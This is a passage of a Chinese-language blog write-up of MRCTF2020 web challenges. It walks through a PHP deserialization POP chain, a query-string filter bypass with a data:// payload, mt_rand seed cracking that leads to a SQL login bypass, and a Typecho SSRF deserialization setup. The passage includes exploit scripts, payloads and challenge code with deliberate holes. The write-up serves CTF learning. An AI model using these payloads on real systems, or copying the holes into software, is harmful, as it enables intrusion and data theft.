&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>__construct</code>构造，默认读取index.php<br><code>__toString</code>，类被当成字符串时调用此方法<br><code>__wakeup</code>，反序列化时调用，万万没想到这个题的__wakeup是利用的不是让绕过的，其实过滤的也没啥，阻止不了读源码。<br>方法分析完看看怎么构造链子，在<code>__wakeup</code>方法中用了<code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code>去过滤<code>$this-&gt;source</code>中的敏感字眼，但是如果<code>$this-&gt;source</code>是<code>Show</code>的话，就会自动调用<code>__toString</code>方法，如果<code>$this-&gt;source</code>是<code>Test</code>类的话，<code>__toString</code>访问不到<code>source</code>属性，就会调用<code>__get</code>方法。</p>
+<p>4、总结一下<br>pop链的开始是<code>Show</code>类，使用反序列化去触发<code>__wakeup</code>魔术方法，<code>__wakeup</code>触发<code>__toString</code>，然后访问不存在的<code>source</code>属性，触发<code>Test</code>类里的<code>__get</code>方法，<code>__get</code>再以访问函数的形式访问一个类去触发<code>Modifier</code>类里的<code>__invoke</code>方法，此方法再调用<code>append</code>函数，完成flag.php的读取<br>exp如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$yq1ng = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($yq1ng)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.g80kpq08xie.png" alt="flag"></p>
+<hr>
+<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><blockquote>
+<p>php字符简单bypass，简单脚本逆向</p>
+</blockquote>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>进题目就是一张大大的北邮图片，源码给了第一关的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>不能提交<code>_</code>或者其url编码<code>%5f</code>，但是下面GET的变量<code>b_u_p_t</code>却有三个<code>_</code>，变量值需要是<code>23333</code>但是后面有匹配不让是<code>23333</code>。。。<br>绕过：在<code>[BJDCTF2020]EzPHP</code>里也提到过，<code>QUERY_STRING</code>是不会解码的，但是if里面也过滤了<code>%5f</code>所以并不能直接编码绕过，在<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">这篇文章</a>里面介绍了一些字符bypass</p>
+<ul>
+<li><code>b.u.p.t</code>  （点代替_）</li>
+<li><code>b u p t</code>  （空格代替_）<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.wc223psyehp.png" alt="bypass1"><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.pvcfiked48.png" alt="bypass2"><br>换行污染字符串匹配可参考<code>[BJDCTF2020]EzPHP</code><br>payload：<code>?b u p t=23333%0a</code><br>得到提示<code>FLAG is in secrettw.php </code><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it?Local access only!</span><br><span class="line">Sorry,you don&#39;t have permission! Your ip is :sorry,this way is banned! </span><br></pre></td></tr></table></figure>
+XFF伪造，没成功。。一股脑把三个伪造都上了，成了。注释有JSFUCK，直接浏览器控制台输入JSFUCK可以解码，让Post me Merak<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.cm0rdkho5jv.png" alt="ip"><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.kkr3mq3pb5.png" alt="jsfuck"><br>给了源码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+对于最后的<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; )</code>可以使用<code>data</code>协议绕过，<code>change</code>函数写一个解密脚本，如下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $v = base64_decode($v);</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($v); $i++) &#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>(base64_encode($re).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line">$a = dechange(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+payload：<code>?2333=data://text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.6hxto886cvh.png" alt="flag"></li>
+</ul>
+<hr>
+<h1 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h1><blockquote>
+<p>伪随机数漏洞，简单sql<br>第一次做伪随机数，不是很顺利哈哈</p>
+</blockquote>
+<p>页面没看到啥有用的，扫了一波，有备份文件<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.h1r19jbypw7.png" alt="www.zip"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>
+<p>公钥已经给我们了，要知道私钥就需要通过公钥算出来种子，在手工算出来私钥就好</p>
+<blockquote>
+<p>mt_rand()返回随机整数，随机就需要种子，<code>mt_scrand()</code>函数通过分发seed种子，使得mt_rand()生成随机数，这还是个伪随机数，可以通过暴力枚举找到种子<br>我知道种子后，可以确定你输出伪随机数的序列。<br>知道你的随机数序列，可以确定你的种子。  </p>
+</blockquote>
+<p>此题已经给了随机数序列，用脚本算出种子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span><span class="comment">#公钥</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j)+<span class="string">&#x27; &#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<p>得到：<code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</code><br>再用php_mt_rand爆破，得到种子：1775196155<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.b3h60obpqfi.png" alt="seed"><br>再用种子去计算私钥</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(public_key().<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(private_key().<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到私钥为<code>XuNhoueCDCGc</code>，sql语句给了，简单万能密码就能登陆<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.bd6zwpgpv4s.png" alt="login"></p>
+<hr>
+<h1 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="MRCTF2020]Ezpop_Revenge"></a>MRCTF2020]Ezpop_Revenge</h1><blockquote>
+<p>pop反序列化链，SSRF<br>本题未完结，菜鸡看不懂wp，想了解的可以参考<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2184.html#EzpopRevenge">Y1ng师傅</a></p>
+</blockquote>
+<p>进去是一个Typecho博客，扫目录发现有<a href="http://www.zip源码泄露，下载看看，第一次做这种框架的（其实自己啥都没做过23333，显得自己厉害？略略略），参考[Y1ng师傅](https://www.gem-love.com/ctf/2184.html#EzpopRevenge)的">www.zip源码泄露，下载看看，第一次做这种框架的（其实自己啥都没做过23333，显得自己厉害？略略略），参考[Y1ng师傅](https://www.gem-love.com/ctf/2184.html#EzpopRevenge)的</a><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.e75dv4fs9x.png" alt="www.zip"><br>参考之前想了一下自己的想法，不能那一道题都直接参考WP吧，嘤嘤嘤<br>以下为自己瞎想的+师傅们的思路<br>全局搜了一下<code>flag</code>想碰碰运气，搜到了两个有用的东西，一个假flag，另一个是flag.php<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.kckhrj9qco9.png" alt="search"><br>在flag.php中提示可能为SSRF</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Plugin.php中虽然是假flag，但是<code>HelloWorld_DB</code>类却有<code>__wakeup</code>函数，反序列化！整个脚本核心代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">            unserialize(base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
